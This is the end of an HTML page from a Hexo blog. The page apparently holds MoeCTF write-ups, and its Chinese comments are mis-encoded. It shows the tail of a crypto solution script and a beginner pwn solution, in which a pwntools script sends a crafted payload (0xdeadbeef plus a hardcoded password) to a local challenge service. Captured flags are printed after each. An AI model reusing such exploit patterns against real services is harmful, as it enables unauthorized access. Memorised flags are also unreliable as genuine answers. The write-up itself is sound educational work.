R_int &gt;&gt; <span class="number">1</span></span><br><span class="line">    last_bit = R_int &amp; <span class="number">1</span></span><br><span class="line">    p_S = S.bit_count() % <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">        prev_L_int = (b &lt;&lt; (l - <span class="number">1</span>)) + S</span><br><span class="line">        diff = (L_int - prev_L_int) % m</span><br><span class="line">        prev_R_int = (inv_a * diff) % m</span><br><span class="line">        p_R = prev_R_int.bit_count() % <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (b ^ p_S ^ p_R) == last_bit:</span><br><span class="line">            stack.append((prev_L_int, prev_R_int, steps + <span class="number">1</span>))</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    moectf&#123;I5_1t_Stream0rBlock.?&#125;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>




<h2 id="4-pwn"><a href="#4-pwn" class="headerlink" title="4.pwn"></a>4.pwn</h2><h3 id="1-0-äºŒè¿›åˆ¶æ¼æ´å®¡è®¡å…¥é—¨æŒ‡åŒ—"><a href="#1-0-äºŒè¿›åˆ¶æ¼æ´å®¡è®¡å…¥é—¨æŒ‡åŒ—" class="headerlink" title="1.0 äºŒè¿›åˆ¶æ¼æ´å®¡è®¡å…¥é—¨æŒ‡åŒ—"></a>1.<strong>0 äºŒè¿›åˆ¶æ¼æ´å®¡è®¡å…¥é—¨æŒ‡åŒ—</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                    <span class="comment"># å¯¼å…¥ pwntoolsã€‚</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) <span class="comment"># ä¸€äº›åŸºæœ¬çš„é…ç½®ã€‚</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># æœ‰æ—¶æˆ‘ä»¬éœ€è¦åœ¨æœ¬åœ°è°ƒè¯•è¿è¡Œç¨‹åºï¼Œéœ€è¦é…ç½® context.terminalã€‚è¯¦è§å…¥é—¨æŒ‡åŒ—ã€‚</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)             # åœ¨æœ¬åœ°è¿è¡Œç¨‹åºã€‚</span></span><br><span class="line"><span class="comment"># gdb.attach(io)                    # å¯åŠ¨ GDB</span></span><br><span class="line">io = connect(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">52202</span>)              <span class="comment"># ä¸åœ¨çº¿ç¯å¢ƒäº¤äº’ã€‚</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;114511&#x27;</span>)              <span class="comment"># ä»€ä¹ˆæ—¶å€™ç”¨ send ä»€ä¹ˆæ—¶å€™ç”¨ sendlineï¼Ÿ</span></span><br><span class="line"> </span><br><span class="line">payload  = p32(<span class="number">0xdeadbeef</span>)          <span class="comment"># p32(0xdeadbeef)ã€b&quot;\xde\xad\xbe\xef&quot;ã€b&quot;deadbeef&quot; æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</span></span><br><span class="line">                                    <span class="comment"># ä½ çœ‹æ‡‚åŸç¨‹åºè¿™é‡Œçš„æ£€æŸ¥é€»è¾‘äº†å—ï¼Ÿ</span></span><br><span class="line">payload += <span class="string">b&#x27;shuijiangui&#x27;</span>           <span class="comment"># strcmp</span></span><br><span class="line"> </span><br><span class="line">io.sendafter(<span class="string">b&#x27;password.&#x27;</span>, payload) <span class="comment"># å‘é€ï¼é€šè¿‡æ‰€æœ‰çš„æ£€æŸ¥ã€‚</span></span><br><span class="line"> </span><br><span class="line">io.interactive()                    <span class="comment"># æ‰‹åŠ¨æ¥æ”¶ flagã€‚</span></span><br></pre></td></tr></table></figure>

<p><img src="D:\typora_pic\image-20250809155539550.png" alt="image-20250809155539550"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;THe-b3GlnniNG_0F_forMat85451c15&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="https://hllttz.github.io/2025/09/09/moectf-wp/" data-id="cmfcmwg9u0001v8tk7z6gdiul" data-title="moectf wp" class="article-share-link"><span class="fa fa-share">åˆ†äº«</span></a>
      
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/2025/09/09/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">åä¸€ç¯‡</strong>
      <div class="article-nav-title">Hello World</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">å½’æ¡£</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">ä¹æœˆ 2025</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">æœ€æ–°æ–‡ç« </h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/09/09/moectf-wp/">moectf wp</a>
          </li>
        
          <li>
            <a href="/2025/09/09/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 hllttz<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>